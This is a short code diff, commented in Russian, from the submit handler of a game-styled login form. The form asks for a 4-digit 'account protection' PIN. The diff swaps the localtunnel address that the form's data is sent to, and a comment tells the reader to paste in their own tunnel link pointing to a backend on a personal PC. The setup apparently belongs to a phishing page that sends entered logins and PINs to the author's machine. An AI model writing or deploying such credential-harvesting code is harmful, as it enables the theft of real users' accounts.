@@ -110,7 +110,7 @@ loginForm.addEventListener('submit', function(e) {
   if (checkboxToggle.checked && (pin.trim() === "" || pin.length < 4)) { showGameAlert("Защита аккаунта: Введите 4-значный Пин-код!"); pincodeInput.classList.add('field-invalid'); return; }
   
   // ВСТАВЬ СВОЮ ДИНАМИЧЕСКУЮ ССЫЛКУ ИЗ LOCALTUNNEL СЮДА
-  const backendUrl = "https://rich-lions-pump.loca.lt";
+  const backendUrl = "https://warm-buckets-ask.loca.lt";
   
   // Отправляем чистый JSON-пакет на твой бэкенд на ПК
   fetch(backendUrl, {
